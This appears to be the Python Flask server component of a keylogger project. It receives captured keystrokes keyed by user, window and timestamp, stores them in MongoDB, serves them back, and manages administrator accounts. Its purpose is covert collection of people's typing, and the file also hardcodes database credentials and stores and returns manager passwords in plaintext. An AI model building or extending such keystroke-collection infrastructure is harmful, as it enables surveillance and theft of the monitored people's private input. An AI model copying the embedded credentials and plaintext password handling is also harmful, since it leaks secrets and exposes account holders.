import os
import subprocess
from flask import request, jsonify
import signal
from pymongo import MongoClient

client = MongoClient(
    "mongodb+srv://haimassraf:Aa123456@cluster0.s8vwr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["key_loger_project"]
data_collection = db["data"]
managers_collection = db["managers"]


def get_data():
    users = list(data_collection.find({}, {"_id": 0}))
    return jsonify(users), 200


def add_data():
    try:
        data = request.json
        for user, windows in data.items():
            for window, timestamps in windows.items():
                existing_entry = data_collection.find_one({"user": user, "window": window})
                if existing_entry:
                    for timestamp, value in timestamps.items():
                        new_value = existing_entry["timestamps"].get(timestamp, "") + value
                        data_collection.update_one(
                            {"user": user, "window": window},
                            {"$set": {f"timestamps.{timestamp}": new_value}}
                        )
                else:
                    data_collection.insert_one({
                        "user": user,
                        "window": window,
                        "timestamps": timestamps
                    })

        updated_data = data_collection.find_one({"user": user, "window": window}, {"_id": 0})
        return jsonify({"message": "Data updated successfully!", "Updated data": updated_data}), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500


def get_managers():
    managers = list(managers_collection.find({}, {"_id": 0}))
    return jsonify(managers), 200


def add_manager():
    try:
        new_manager = request.json
        if managers_collection.find_one({"user_name": new_manager['user_name']}):
            return jsonify({"error": "Manager already exists!"}), 400

        if managers_collection.find_one({"email": new_manager['email']}):
            return jsonify({"error": "Email already exists!"}), 400

        managers_collection.insert_one({
            "user_name": new_manager['user_name'],
            "password": new_manager['password'],
            "email": new_manager['email']
        })

        return jsonify({"message": "Manager added successfully!", "new_manager": {
            "user_name": new_manager['user_name'],
            "password": new_manager['password'],
            "email": new_manager['email']
        }}), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500
